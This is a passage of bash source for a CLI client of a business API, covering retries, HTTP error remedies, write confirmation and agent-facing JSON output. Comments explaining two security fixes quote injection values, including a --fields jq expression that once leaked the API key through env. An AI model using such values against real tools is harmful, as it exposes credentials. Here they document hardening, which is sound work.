    if [ "$rc" -eq 0 ]; then break; fi
    if [ "$attempt" -eq 1 ]; then
      case "$method" in
        GET|HEAD)
          case "$rc" in
            6|7|28|35|52|56) attempt=2; continue ;;
          esac ;;
      esac
    fi
    break
  done
  if [ "$rc" -ne 0 ]; then
    # UKU_SOFT lets callers (doctor) probe without the CLI dying on a flake.
    [ "${UKU_SOFT:-0}" = "1" ] && { REPLY_STATUS=0; REPLY_BODY=""; REPLY_HEADERS=""; return 1; }
    die "could not reach $UKU_BASE (network error)" "$EX_NET" @@doctor
  fi
  REPLY_BODY="$(cat "$tmp")"
  REPLY_HEADERS="$(cat "$hdrf" 2>/dev/null || true)"
  _rmtmp "$tmp" "$cfg" "$hdrf" "${body:-}"   # the reply is in memory now; don't hoard buffers (see _rmtmp)
  _rl_capture "$method"
  # 429 on a READ is recoverable: the window turns over at Reset, so wait it out
  # once. A 429'd WRITE is never retried — the request may or may not have been
  # applied before the limiter saw it, and the CLI cannot tell.
  if [ "$REPLY_STATUS" = "429" ] && [ "${_UKU_RETRIED:-0}" != "1" ]; then
    case "$method" in
      GET|HEAD)
        local w; w="$(_rl_wait_secs)"
        if [ -n "$w" ] && [ "$w" -gt 0 ] && [ "$w" -le "$UKU_RL_MAX_WAIT" ]; then
          warn "rate limited — waiting ${w}s for the window to reset, then retrying this read once."
          sleep "$w"
          _UKU_RETRIED=1 do_request "$method" "$path" "$data"
          return 0
        fi ;;
    esac
  fi
  # Ledger first, heal second, so the log reads chronologically:
  #   POST … 428 · HEAL428 … · POST … 201
  case "$method" in
    GET|HEAD) : ;;
    *) _audit "$method" "$path" "$REPLY_STATUS" ;;
  esac
  # 428 auto-heal: fetch the ETag and resend ONCE. Nothing was written, so this
  # cannot double-apply; see _heal_428.
  if [ "$REPLY_STATUS" = "428" ] && [ "${_UKU_NO_HEAL:-0}" != "1" ]; then
    _heal_428 "$method" "$path" "$data" || true
  fi
  return 0
}

# render BODY  — pretty JSON when jq is present and TTY; raw otherwise.
render() {
  local body="$1"
  if [ "${UKU_AGENT:-0}" = "1" ]; then _agent_ok "$body" "$UKU_SUMMARY"; return; fi
  if [ "${UKU_JSON:-0}" = "1" ] || ! _is_tty; then
    printf '%s\n' "$body"; _bc_flush; return
  fi
  if have jq; then printf '%s\n' "$body" | jq .; else printf '%s\n' "$body"; fi
  _bc_flush
}

# _valid_field NAME — plain identifier only (letters, digits, underscore; no
# leading digit). S4: `table()`'s TTY path used to splice --fields values
# straight into a jq program (`.$f`); jq can't spawn processes, but it CAN
# read `env`, so `--fields 'zzz // env.UKU_API_KEY'` printed the live key on a
# TTY. Denylisting the dangerous characters is not enough on its own (there is
# always one more jq builtin), so this is a strict allowlist, checked once at
# the flag's parse site (_check_fields_arg) before any command sees the value.
_valid_field() {
  case "$1" in
    "") return 1 ;;
    [0-9]*) return 1 ;;
    *[![:alnum:]_]*) return 1 ;;
    *) return 0 ;;
  esac
}
# _check_fields_arg VALUE — dies unless every comma-separated name in VALUE
# passes _valid_field. Called once, at --fields' global parse site, so every
# consumer (table()'s TTY path, _project_fields' JSON/--agent path) only ever
# sees names that were already checked — neither has to remember to re-check.
_check_fields_arg() {
  local raw="$1" field
  local IFS=','; set -- $raw; unset IFS
  for field in "$@"; do
    _valid_field "$field" || die "--fields wants plain field names (letters, digits, underscore — e.g. id,name); got '$field'." "$EX_USAGE"
  done
}

# _project_fields BODY — BODY with every row in .data reduced to the keys named
# by --fields, in the order the user named them, envelope (.meta) untouched. A
# key a row does not have comes back null rather than vanishing, so every row
# has the same shape and a consumer can index it without checking.
_project_fields() {
  printf '%s' "$1" | jq --arg fields "$UKU_FIELDS" '
    ($fields | split(",") | map(select(length > 0))) as $f
    | def pick: . as $row | reduce $f[] as $k ({}; .[$k] = $row[$k]);
      if (.data | type) == "array"  then .data |= map(pick)
      elif (.data | type) == "object" then .data |= pick
      else . end' 2>/dev/null
}

# table BODY COL1 COL2 ...  — compact table of .data[] fields when jq present.
table() {
  local body="$1"; shift
  # --fields id,name overrides the default columns (#8)
  if [ -n "${UKU_FIELDS:-}" ]; then local IFS=','; set -- $UKU_FIELDS; unset IFS; fi
  if [ "${UKU_AGENT:-0}" = "1" ] || [ "${UKU_JSON:-0}" = "1" ] || ! _is_tty || ! have jq; then
    # --fields is explicit intent, and JSON is what a script or an agent gets by
    # default — so honour it there too, by projecting each row down to the keys
    # named. It used to be silently dropped on every non-TTY run, which made the
    # flag do nothing at all for exactly the callers most likely to pass it.
    if [ -n "${UKU_FIELDS:-}" ]; then
      if have jq; then
        local projected; projected="$(_project_fields "$body")"
        if [ -n "$projected" ]; then render "$projected"; return; fi
        warn "--fields could not be applied to this response — showing it whole."
      else
        # Degraded shape, not an unkept promise — see the jq-degradation rule
        # near have() — so warn and continue rather than refuse.
        warn "--fields needs jq to select keys from JSON output — showing every field."
      fi
    fi
    render "$body"; return
  fi
  local hdr=""
  for f in "$@"; do hdr="$hdr$(printf '%s' "$f" | tr '[:lower:]' '[:upper:]')\t"; done
  # Field names go in as jq POSITIONAL STRING ARGUMENTS (--args / $ARGS.positional),
  # never spliced into the program text (S4). --fields is already restricted to
  # plain identifiers by _check_fields_arg at parse time, but that check living
  # correctly is not the only thing standing between user text and program
  # text — the passing mechanism itself must be structurally unable to run a
  # field name as code, the same discipline _project_fields already used for
  # the JSON/--agent path.
  local rows
  rows="$(printf '%s' "$body" | jq -r --args '
      ($ARGS.positional) as $fields
      | .data[]? | [ $fields[] as $k | (.[$k] // "-") ] | @tsv
    ' -- "$@" 2>/dev/null || true)"
  if have column; then
    { printf '%b\n' "$(_bold "${hdr%\\t}")"; printf '%s\n' "$rows"; } | column -t -s "$(printf '\t')"
  else
    printf '%b\n' "$(_bold "${hdr%\\t}")"; printf '%s\n' "$rows" | tr '\t' ' '
  fi
  _pagination_footer "$body"
  _bc_flush
}

# _pagination_footer BODY — "— N of TOTAL · more: --offset X" from meta.
_pagination_footer() {
  have jq || return 0
  local total offset limit shown
  total="$(printf '%s' "$1" | jq -r '.meta.total // empty' 2>/dev/null)"
  offset="$(printf '%s' "$1" | jq -r '.meta.offset // 0' 2>/dev/null)"
  limit="$(printf '%s' "$1" | jq -r '.meta.limit // empty' 2>/dev/null)"
  shown="$(printf '%s' "$1" | jq -r '(.data | length) // 0' 2>/dev/null)"
  [ -n "$total" ] || return 0
  local seen=$(( offset + shown ))
  if [ "$seen" -lt "$total" ] 2>/dev/null; then
    printf '  %s\n' "$(_dim "— $seen of $total · more: add --offset $seen  (or --all)")" >&2
  else
    printf '  %s\n' "$(_dim "— $total of $total")" >&2
  fi
}

# _urlencode STRING — RFC-3986 percent-encode, pure bash, byte-correct (LC_ALL=C).
#
# The & 0xFF is load-bearing, not paranoia. bash 3.2 treats the char in "'$c"
# as SIGNED, so a UTF-8 continuation byte (0xE2 in an em-dash, 0xC3 in "ä")
# came out as -30 and printf %02X rendered it "%FFFFFFFFFFFFFFE2" — a query the
# API cannot match. Found while batching against real data; it broke every
# non-ASCII filter, e.g. --q "Käibedeklaratsioon".
_urlencode() {
  local LC_ALL=C s="$1" out="" i c
  for (( i=0; i<${#s}; i++ )); do
    c="${s:i:1}"
    case "$c" in [a-zA-Z0-9.~_-]) out="$out$c" ;; *) out="$out$(printf '%%%02X' "$(( $(printf '%d' "'$c") & 0xFF ))")" ;; esac
  done
  printf '%s' "$out"
}

# _api_fail EXIT MESSAGE BODY [REMEDY [ARG…]] — the exit path for a failed
# response. On a terminal the human warnings above it have already been
# printed, so this adds the remedy line and the server's own body; under
# --agent it is ONE object on stdout instead, carrying the same facts.
_api_fail() {
  local code="$1" msg="$2" body="$3"; shift 3
  local hint=""
  [ "$#" -gt 0 ] && hint="$(_bc_render "$@")"
  if [ "${UKU_AGENT:-0}" = "1" ]; then _agent_error "$msg" "$code" "$hint"; exit "$code"; fi
  _hint_line "$hint"
  [ -n "$body" ] && printf '%s\n' "$body" >&2
  exit "$code"
}

# check_status BODY — die with a helpful message on 4xx/5xx (uses REPLY_STATUS).
check_status() {
  local body="$1" s="$REPLY_STATUS"
  case "$s" in
    2*) return 0 ;;
    401|403)
      # Exit codes are the agent's API: auth/permission failures are EX_AUTH (2),
      # distinct from a generic API error (3), so an agent knows to re-auth.
      local code msg
      code="$(printf '%s' "$body" | (have jq && jq -r '.error.code // .code // empty' 2>/dev/null || true))"
      msg="$(printf '%s' "$body" | (have jq && jq -r '.error.message // .error // .message // empty' 2>/dev/null || true))"
      # match the structured code (not a free-text body that merely names a "Financial Corp" client — N18)
      case "$code" in
        *[Ss][Cc][Oo][Pp][Ee]*|*[Ff][Ii][Nn][Aa][Nn][Cc][Ii][Aa][Ll]*)
          warn "$(_bold "HTTP $s") — this key can't perform that action."
          warn "Financial actions need an All-scope key; read/operate keys can't touch money."
          _api_fail "$EX_AUTH" "HTTP $s — this key can't perform that action: financial actions need an All-scope key." "$body" @@money.key ;;
        *)
          warn "$(_bold "HTTP $s") — ${msg:-authentication or permission denied.}  Try: uku auth status"
          # 401 is "who are you"; 403 is "not you, or not that account".
          case "$s" in
            401) _api_fail "$EX_AUTH" "HTTP $s — ${msg:-authentication failed}" "$body" @@auth.login ;;
            *)   _api_fail "$EX_AUTH" "HTTP $s — ${msg:-permission denied}" "$body" @@auth.status ;;
          esac ;;
      esac ;;
    409)
      # Domain conflict — the record is fine, the ACTION is not allowed right now
      # (*_EXISTS, *_LOCKED, TIMER_ALREADY_RUNNING, STATUS_TRANSITION_NOT_SUPPORTED).
      # Retrying the identical request will fail identically; change the request.
      warn "$(_bold "HTTP 409") — the API refused this on a domain rule (e.g. already exists, locked, or a timer is already running). Nothing changed. Re-sending the same request will fail the same way — read the code below and change the request."
      # A running timer is the 409 people actually hit, and it has a real next
      # step; the other domain rules do not, so they get the message only.
      case "$(printf '%s' "$body" | (have jq && jq -r '.error.code // .code // empty' 2>/dev/null || true))" in
        *TIMER_ALREADY_RUNNING*) _api_fail "$EX_API" "HTTP 409 — a timer is already running for this person; nothing changed." "$body" @@time.list ;;
        *) _api_fail "$EX_API" "HTTP 409 — the API refused this on a domain rule. Nothing changed; re-sending it unchanged will fail the same way." "$body" ;;
      esac ;;
    412)
      # STALE_WRITE. This is the whole reason If-Match exists: someone else
      # changed the record after it was read. Re-GETting and resending would
      # silently overwrite their edit — the exact lost update we are preventing.
      # So: hard stop, its own exit code, never automatic.
      warn "$(_bold "HTTP 412") — someone else changed this record after you read it. Nothing was written."
      warn "Re-read the record, re-apply your change on top of the CURRENT values, then write again. This is never retried automatically: a blind retry would overwrite their edit."
      # "Re-read it" is only advice until we say WHICH read. When the path
      # named a record we know the exact command; otherwise say the true thing
      # in words rather than guess at a command.
      local cf_cmd cf_id
      cf_cmd="$(_res_cmd "${REPLY_PATH:-}")"; cf_id="$(_path_id "${REPLY_PATH:-}")"
      if [ -n "$cf_cmd" ] && [ -n "$cf_id" ]; then
        _api_fail "$EX_CONFLICT" "HTTP 412 — someone else changed this record after you read it. Nothing was written." "$body" "@@$cf_cmd.get" "$cf_id"
      fi
      _api_fail "$EX_CONFLICT" "HTTP 412 — someone else changed this record after you read it. Nothing was written." "$body" @@stale.reread ;;
    428)
      if [ "${_UKU_428_SUPPLIED:-0}" = "1" ]; then
        warn "$(_bold "HTTP 428") — the --if-match value you supplied was rejected as missing or invalid. Not retrying."
        warn "GET the resource and use the ETag from its response header, or drop --if-match and let the CLI fetch it."
      else
        warn "$(_bold "HTTP 428") — this write needs an If-Match (version) header, and no ETag could be found for it."
        warn "GET the guarded resource, read its ETag response header, and pass it: uku --if-match '<etag>' …"
      fi
      _api_fail "$EX_API" "HTTP 428 — this write needs an If-Match (version) header. Nothing was written." "$body" @@ifmatch.supply ;;
    429)
      local rlw; rlw="$(_rl_wait_secs)"
      if [ -n "$rlw" ] && [ "$rlw" -gt 0 ] 2>/dev/null; then
        warn "$(_bold "HTTP 429") — rate limited ($(_reply_header X-RateLimit-Tier) budget, limit $(_reply_header X-RateLimit-Limit)). Wait ${rlw}s: the window resets at $(_rl_when "$(_reply_header X-RateLimit-Reset)")."
      else
        warn "$(_bold "HTTP 429") — rate limited. Wait for the window to reset before retrying."
      fi
      warn "Reads may be retried (the CLI already waits once). A WRITE must not be retried — its outcome is unknown; GET to check whether it landed before resending."
      _api_fail "$EX_NET" "HTTP 429 — rate limited.${rlw:+ The window resets in ${rlw}s.}" "$body" @@ratelimit.wait ;;
    5*)
      # The remedy splits by METHOD, because the two cases are not alike. On a
      # write the outcome is genuinely unknown and the only safe next move is a
      # GET. On a READ nothing was written, so telling the user to "GET the
      # resource to see whether the write landed" describes an event that did
      # not happen — and an agent acting on it goes looking for a change nobody
      # made.
      warn "$(_bold "HTTP $s") — request failed."
      case "${REPLY_METHOD:-}" in
        GET|HEAD)
          _api_fail "$EX_API" "HTTP $s — the server failed on a read. Nothing was written." "$body" @@server.read ;;
        *)
          _api_fail "$EX_API" "HTTP $s — the server failed. For a write the outcome is unknown." "$body" @@unknown.outcome ;;
      esac ;;
    400|404|422)
      warn "$(_bold "HTTP $s") — request failed."
      _api_fail "$EX_API" "HTTP $s — $(_body_msg "$body" | tr '\n' ' ' | cut -c1-200)" "$body" @@api.describe ;;
    *)
      warn "$(_bold "HTTP $s") — request failed."
      _api_fail "$EX_API" "HTTP $s — request failed." "$body" ;;
  esac
}

# confirm_write ACTION — deliberate-write gate.
confirm_write() {
  # --dry-run sends nothing, so there is nothing to confirm. Demanding --yes to
  # PREVIEW a write defeats the point of previewing it before approving it —
  # and run_batch has always skipped the confirm under --dry-run, so a single
  # write was refused where the same write in a batch file was not. One gate,
  # one rule (the "sent nothing" guarantee is do_request's, and is unchanged).
  [ "${UKU_DRY:-0}" = "1" ] && return 0
  [ "${UKU_YES:-0}" = "1" ] && return 0
  if ! _is_tty; then
    # The remedy here is the caller's OWN line with --yes on the end. It is the
    # one command that cannot be declared in advance, and the one nobody should
    # have to retype.
    die "Refusing a non-interactive write ($1). Re-run with --yes to confirm." "$EX_CONFIRM" "$(_argv_cmd --yes -y) --yes"
  fi
  printf '%s %s [y/N] ' "$(_bold 'Confirm write:')" "$1" >&2
  local reply=""; read -r reply < /dev/tty || true   # init so a failed tty read refuses, never set -u crashes (N8)
  case "$reply" in y|Y|yes|YES) return 0 ;; *) die "Cancelled." "$EX_CONFIRM" ;; esac
}

# build_query k=v ...  → "?k=v&k2=v2" (keys AND values RFC-3986 percent-encoded)
# S10c: only values were encoded — `uku api ... --query 'a#=1'` let a `--query`
# key inject a literal `#` (or `&`, splitting in another param) into the query
# string. Harmless here (it is only ever the caller's own request), but wrong,
# and cheap to close: encode the key with the same function used on the value.
build_query() {
  local q=""
  for kv in "$@"; do
    local k="${kv%%=*}" v="${kv#*=}"
    [ "$k" = "$kv" ] && continue
    q="$q&$(_urlencode "$k")=$(_urlencode "$v")"
  done
  [ -n "$q" ] && printf '?%s' "${q#&}"
  return 0
}

# _validate_json PAYLOAD — catch a malformed body BEFORE the confirm gate, so a
# user never approves a write only to learn it was garbage (audit #4). No-op
# without jq (the API still validates server-side).
_validate_json() {
  have jq || return 0
  printf '%s' "$1" | jq -e . >/dev/null 2>&1 || die "the --data payload isn't valid JSON. Nothing sent." "$EX_USAGE"
}

# read_data ARG  — resolve --data value: @file, @- (stdin), or literal JSON.
read_data() {
  case "$1" in
    @-) cat ;;
    @*) local f="${1#@}"; [ -f "$f" ] || die "data file not found: $f" "$EX_USAGE"; cat "$f" ;;
    *) printf '%s' "$1" ;;
  esac
}

# ── Being driven: remedies, breadcrumbs, and the --agent envelope ────
#
# A failure with no next step is a dead end, and a success that does not say
# what is now possible makes the caller guess. Both are answered from ONE
# declared table, for the same reason the command surface is declared: a
# breadcrumb that names a command the CLI does not have is worse than no
# breadcrumb, and only a table can be checked by the build gate.
#
#   @@slug | template | why
#
# * `{1}`, `{2}` are filled in at the call site with real ids from the response.
# * A template starting with `uku ` is a COMMAND: scripts/check-drift.sh
#   resolves it against `.surface`, so it cannot name fiction.
# * A template that does not is PROSE — the honest shape when no command fixes
#   it ("re-read the record, re-apply your change"). Inventing a command there
#   would be worse than saying the true thing in words.
# * The gate also checks the other direction: every `@@slug` written anywhere in
#   this file must exist in the table (`grep -oE '@@[a-z]+\.[a-z-]+'`), which is
#   why the prefix is `@@` and not something a file path could ever look like.
_remedy_table() {
  cat <<'TABLE'
@@auth.login      | uku auth login                        | sign in
@@auth.status     | uku auth status                       | check the key you are using
@@account.list    | uku account list                      | the accounts on this machine
@@account.current | uku account current                   | which account this would hit
@@doctor          | uku doctor                            | check the install end to end
@@setup.agents    | uku setup agents                      | install the agent skill
@@update          | uku update                            | upgrade in place
@@help.root       | uku help                              | every command
@@help.topic      | uku help {1}                          | the card for this command
@@help.batch      | uku help batch                        | how a batch and its ledger work
@@api.describe    | uku api --describe                    | the resource map and required fields
@@batch.list      | uku batch list                        | the runs this machine has done
@@batch.show      | uku batch show {1}                    | what that run actually did
@@clients.list    | uku clients list                      | the clients
@@clients.get     | uku clients get {1}                   | that client in full
@@clients.patch   | uku clients patch {1}                 | change it
@@tasks.list      | uku tasks list                        | the tasks
@@tasks.get       | uku tasks get {1}                     | that task in full
@@tasks.patch     | uku tasks patch {1}                   | change it
@@time.list       | uku time list                         | the time entries
@@time.get        | uku time get {1}                      | that entry in full
@@invoices.list   | uku invoices list                     | the invoices
@@invoices.get    | uku invoices get {1}                  | that invoice in full
@@members.get     | uku members get {1}                   | that member in full
@@products.get    | uku products get {1}                  | that product in full
@@contracts.get   | uku contracts get {1}                 | that contract in full
@@projects.get    | uku projects get {1}                  | that project in full
@@members.list    | uku members list                      | the members
@@products.list   | uku products list                     | the products
@@contracts.list  | uku contracts list                    | the contracts
@@projects.list   | uku projects list                     | the projects
@@search.run      | uku search {1}                        | the same query across every list endpoint
@@filter.unhonoured | the API did not apply client_id on this endpoint, so no --client answer from it can be trusted: re-run without --client and filter the rows yourself, or narrow with --q | -
@@name.ambiguous  | pass the id of the one you mean — the candidates are listed above, and guessing between them is the one thing this CLI will not do | -
@@name.truncated  | narrow the name until the lookup can see every candidate (it reads at most 100 records), or pass the id | -
@@ref.ambiguous   | say which reading you meant: --by-id treats the argument as an id, --by-name resolves it as a name | -
@@url.host        | paste a URL from the account this CLI is signed in to, or pass the record id | -
@@money.key       | this needs an All-scope key — create one in Uku (Settings, API), then sign in again with: uku auth login | -
@@stale.reread    | re-read the record, re-apply your change on top of the CURRENT values, then write again | -
@@ifmatch.supply  | GET the guarded resource, take its ETag response header, and pass it: uku --if-match '<etag>' ... | -
@@ratelimit.wait  | wait for the window to reset; after a write, GET first to see whether it landed | -
@@unknown.outcome | the outcome is unknown — GET the resource to see whether the write landed before re-sending | -
@@server.read     | nothing was written — this was a read, so it is safe to run the same command again once the server recovers | -
TABLE
}

# _dump_remedies (hidden) — slug<TAB>template, one per line. The gate's hook.
_dump_remedies() {
  _remedy_table | awk -F'|' '
    { s=$1; t=$2; gsub(/^[ \t]+|[ \t]+$/,"",s); gsub(/^[ \t]+|[ \t]+$/,"",t)
      if (s ~ /^@@/) printf "%s\t%s\n", s, t }' | LC_ALL=C sort -u
  return 0
}
# _remedy_get SLUG COLUMN — one field of one row (2 = template, 3 = why).
# A heredoc, not a pipe: an awk that `exit`s early leaves the writer holding an
# unread pipe, and with `set -o pipefail` that EPIPE becomes the status of the
# whole statement. (This is not theoretical — it is exactly how the first
# version of `uku <cmd> --help --agent` failed, on a 15KB write into a 16KB
# macOS pipe buffer.)
_remedy_get() {
  awk -F'|' -v k="$1" -v c="$2" '
    { s=$1; gsub(/^[ \t]+|[ \t]+$/,"",s)
      if (s == k) { v=$c; gsub(/^[ \t]+|[ \t]+$/,"",v); print v; exit } }' <<EOF
$(_remedy_table)
EOF
  return 0
}

# _bc_render SLUG|TEXT [ARG…] — the remedy string with {N} filled in.
# A first argument that is NOT an @@slug is literal text, used in the one place
# where the command is built from the user's own argv (a batch resume, a refused
# write): there is nothing to declare, because it is the caller's own line.
_bc_render() {
  local key="$1"; shift
  local tpl=""
  case "$key" in
    @@*) tpl="$(_remedy_get "$key" 2)"
         [ -n "$tpl" ] || { warn "internal: no remedy declared for $key"; return 0; } ;;
    *)   tpl="$key" ;;
  esac
  local i=1 a
  for a in ${@+"$@"}; do
    tpl="${tpl//"{$i}"/$a}"
    i=$((i + 1))
  done
  printf '%s' "$tpl"
  return 0
}

# _hint_line TEXT — the second line of an error: what to do next.
_hint_line() {
  [ -n "$1" ] || return 0
  case "$1" in
    "uku "*) printf '  %s\n' "$(_dim "→ run: $1")" >&2 ;;
    *)       printf '  %s\n' "$(_dim "→ $1")" >&2 ;;
  esac
  return 0
}

# ── breadcrumbs ──────────────────────────────────────────────────────
# What a caller most plausibly wants next, with the ids already filled in.
UKU_BC=""          # accumulated "command<TAB>why" lines
UKU_SUMMARY=""     # the one-line human summary for the --agent envelope
_bc_enabled() {
  [ "${UKU_NO_HINTS:-0}" = "1" ] && return 1
  [ "${UKU_QUIET:-0}" = "1" ] && return 1
  return 0
}
# _wants_extras — is it worth computing a summary and breadcrumbs at all?
# (--json never gets them; a non-TTY without --agent is --json by default.)
_wants_extras() {
  [ "${UKU_AGENT:-0}" = "1" ] && return 0
  [ "${UKU_JSON:-0}" = "1" ] && return 1
  _bc_enabled || return 1
  _is_tty
}
_bc_add() { # SLUG|TEXT [ARG…]
  local cmd why
  cmd="$(_bc_render "$@")"
  [ -n "$cmd" ] || return 0
  why=""
  case "$1" in @@*) why="$(_remedy_get "$1" 3)"; [ "$why" = "-" ] && why="" ;; esac
  UKU_BC="$UKU_BC$cmd	$why"$'\n'
  return 0
}
_bc_json() {
  if ! _bc_enabled; then printf '[]'; return 0; fi
  local first=1 cmd why
  printf '['
  while IFS='	' read -r cmd why; do
    [ -n "$cmd" ] || continue
    [ "$first" = "1" ] || printf ','
    first=0
    printf '{"cmd":%s,"why":%s}' "$(_json_str "$cmd")" \
      "$([ -n "$why" ] && _json_str "$why" || printf 'null')"
  done <<EOF
$(printf '%s' "$UKU_BC")
EOF
  printf ']'
  return 0
}
# _bc_flush — the dim TTY footer. Never on --json, --quiet, --no-hints, --agent
# or a pipe: on those channels stdout is a contract and stderr is noise.
_bc_flush() {
  local bc="$UKU_BC"; UKU_BC=""
  [ -n "$bc" ] || return 0
  [ "${UKU_AGENT:-0}" = "1" ] && return 0
  [ "${UKU_JSON:-0}" = "1" ] && return 0
  _bc_enabled || return 0
  _is_tty || return 0
  local cmd why
  printf '  %s\n' "$(_dim 'Next:')" >&2
  while IFS='	' read -r cmd why; do
    [ -n "$cmd" ] || continue
    printf '  %s\n' "$(_dim "  $cmd${why:+   · $why}")" >&2
  done <<EOF
$bc
EOF
  return 0
}

# ── the --agent envelope ─────────────────────────────────────────────
# --json is NOT touched: it is documented as the raw API body and the embedded
# skill tells agents to parse `.data`. Adding CLI-invented keys to something
# advertised as raw would be dishonest and would break every agent already
# reading it. --agent is the second channel, and inside it `.data` still means
# exactly what it meant — the same bytes, spliced out of the response.
#
# _json_scan MODE WANT — JSON on stdin.
#   field KEY  → the RAW bytes of top-level KEY's value (nothing re-serialised,
#                so `--agent | jq .data` and `--json | jq .data` are equal)
#   len   -    → the number of elements of a top-level array (-1 if not one)
# awk, not jq: jq is optional, and re-serialising through jq would make the
# bytes ours rather than the server's. The cost is a character walk, paid only
# in --agent mode.
_json_scan() {
  awk -v mode="$1" -v want="$2" '
    function skipws(i) { while (i <= n && substr(buf,i,1) ~ /[ \t\r\n]/) i++; return i }
    function readstr(i,   ch) {
      STR = ""; i++
      while (i <= n) {
        ch = substr(buf,i,1)
        if (ch == "\\") { STR = STR ch substr(buf,i+1,1); i += 2; continue }
        if (ch == "\"") { i++; break }
        STR = STR ch; i++
      }
      return i }
    function skipval(i,   ch,d) {
      ch = substr(buf,i,1)
      if (ch == "\"") return readstr(i)
      if (ch == "{" || ch == "[") {
        d = 0
        while (i <= n) {
          ch = substr(buf,i,1)
          if (ch == "\"") { i = readstr(i); continue }
          if (ch == "{" || ch == "[") d++
          else if (ch == "}" || ch == "]") { d--; i++; if (d == 0) return i; continue }
          i++
        }
        return i }
      while (i <= n && substr(buf,i,1) !~ /[,}\]\[{ \t\r\n]/) i++
      return i }
    function arrlen(   i,ch,d,cnt) {
      i = skipws(1)
      if (substr(buf,i,1) != "[") return -1
      i++; i = skipws(i)
      if (substr(buf,i,1) == "]") return 0
      cnt = 1; d = 0
      while (i <= n) {
        ch = substr(buf,i,1)
        if (ch == "\"") { i = readstr(i); continue }
        if (ch == "[" || ch == "{") d++
        else if (ch == "]" || ch == "}") { if (d == 0) break; d-- }
        else if (ch == "," && d == 0) cnt++
        i++
      }
      return cnt }
    { buf = buf $0 "\n" }
    END {
      n = length(buf)
      if (mode == "len") { print arrlen(); exit }
      i = skipws(1)
      if (substr(buf,i,1) != "{") exit
      i++
      while (i <= n) {
        i = skipws(i); ch = substr(buf,i,1)
        if (ch == "}" || ch == "") exit
        if (ch == ",") { i++; continue }
        if (ch != "\"") exit
        i = readstr(i); key = STR
        i = skipws(i)
        if (substr(buf,i,1) != ":") exit
        i++
        i = skipws(i); start = i
        i = skipval(i)
        if (key == want) { printf "%s", substr(buf,start,i-start); exit }
      }
    }'
  return 0
}

# _exit_name CODE — the stable symbolic name of an exit code. This is what
# `code` holds in an --agent error: the exit status and the code are one fact
# said twice, so an agent can branch on either.
_exit_name() {
  case "$1" in
    0) printf 'ok' ;;      1) printf 'usage' ;;   2) printf 'auth' ;;
    3) printf 'api' ;;     4) printf 'confirm' ;; 5) printf 'network' ;;
    6) printf 'conflict' ;; *) printf 'error' ;;
  esac
}

_agent_ok() { # BODY SUMMARY
  local body="$1" summary="$2" data="" meta=""
  if [ -n "$body" ]; then
    data="$(printf '%s' "$body" | _json_scan field data)"
    meta="$(printf '%s' "$body" | _json_scan field meta)"
  fi
  # A body with no top-level `data` IS the data (uku doctor, uku auth status).
  [ -n "$data" ] || data="$body"
  [ -n "$data" ] || data="null"
  [ -n "$meta" ] || meta="null"
  printf '{"ok":true,"data":%s,"meta":%s,"summary":%s,"breadcrumbs":%s}\n' \
    "$data" "$meta" "$(_json_str "$summary")" "$(_bc_json)"
  UKU_BC=""
  return 0
}
_agent_error() { # MESSAGE EXITCODE HINT
  printf '{"ok":false,"error":%s,"code":%s,"hint":%s}\n' \
    "$(_json_str "$1")" "$(_json_str "$(_exit_name "$2")")" \
    "$([ -n "$3" ] && _json_str "$3" || printf 'null')"
  return 0
}

# _argv_cmd DROP… — the line the user just ran, rebuilt from the original argv
# with the named flags removed. Used for the one remedy that cannot be declared
# in advance, because it is the caller's own command with one flag added.
_argv_cmd() {
  local out="uku" a d skip
  for a in ${UKU_ARGV[@]+"${UKU_ARGV[@]}"}; do
    skip=0
    for d in ${@+"$@"}; do [ "$a" = "$d" ] && skip=1; done
    [ "$skip" = "1" ] && continue
    case "$a" in
      *[![:alnum:]@/._=-]*) out="$out '$(_sq "$a")'" ;;
      *) out="$out $a" ;;
    esac
  done
  printf '%s' "$out"
  return 0
}

# ── which resource a path belongs to (explicit, not parsed) ──────────
_res_cmd() { # API PATH → the uku command that owns it, or ""
  case "${1%%\?*}" in
    /api/v3/clients|/api/v3/clients/*)           printf 'clients' ;;
    /api/v3/tasks|/api/v3/tasks/*)               printf 'tasks' ;;
    /api/v3/time-entries|/api/v3/time-entries/*) printf 'time' ;;
    /api/v3/invoices|/api/v3/invoices/*)         printf 'invoices' ;;
    /api/v3/members|/api/v3/members/*)           printf 'members' ;;
    /api/v3/products|/api/v3/products/*)         printf 'products' ;;
    /api/v3/contracts|/api/v3/contracts/*)       printf 'contracts' ;;
    /api/v3/projects|/api/v3/projects/*)         printf 'projects' ;;
    *) printf '' ;;
  esac
}
_res_one()  { case "$1" in clients) printf 'client' ;; tasks) printf 'task' ;; time) printf 'time entry' ;;
                invoices) printf 'invoice' ;; members) printf 'member' ;; products) printf 'product' ;;
                contracts) printf 'contract' ;; projects) printf 'project' ;; *) printf 'record' ;; esac; }
_res_many() { case "$1" in time) printf 'time entries' ;; *) printf '%s' "$1" ;; esac; }
# _res_n COUNT RESOURCE — the noun that agrees with the count. Every message
# that interpolates a number was reading "1 clients"; a tool that writes a
# firm's invoices should not sound like a stuck template.
_res_n() { if [ "$1" = "1" ]; then _res_one "$2"; else _res_many "$2"; fi; }
# _path_id PATH — the id the path names, if its last segment is one.
_path_id() { local p="${1%%\?*}"; p="${p%/}"; local s="${p##*/}"; _looks_like_id "$s" && printf '%s' "$s" || printf ''; return 0; }
# _first_id JSON — the id of the first record in an array, or of an object.
_first_id() {
  [ -n "$1" ] || return 0
  if have jq; then
    printf '%s' "$1" | jq -r 'if type=="array" then (.[0].id // empty) elif type=="object" then (.id // empty) else empty end | tostring' 2>/dev/null | head -n1
  else
    printf '%s' "$1" | awk 'match($0, /"id"[ \t]*:[ \t]*("[^"]*"|[0-9]+)/) {
      s = substr($0, RSTART, RLENGTH); sub(/^"id"[ \t]*:[ \t]*/, "", s); gsub(/"/, "", s); print s; exit }'
  fi
  return 0
}

# ── naming a record: an id, a name, or a URL you pasted ──────────────
#
# A person reading Uku in a browser has a NAME on screen and a URL on the
# clipboard; they do not have the id. Three declared tables carry everything
# this feature knows, because the alternative — guessing an endpoint, a query
# parameter or a web route — is exactly the failure this CLI was hardened
# against. Nothing below invents any of the three:
#
#   _res_path       the collection paths already in `uku api --describe`.
#   _name_field     the field a name is matched on, taken from the columns each
#                   list command already declares (clients id name status type,
#                   tasks id title status client_id, …). A resource with no
#                   name-shaped column is NOT resolvable by name — it is not
#                   given a guessed one.
#   _takes_client_filter   the collections whose own list columns carry a
#                   client_id (tasks, invoices, contracts, projects) plus
#                   time-entries, which the README, the embedded skill and the
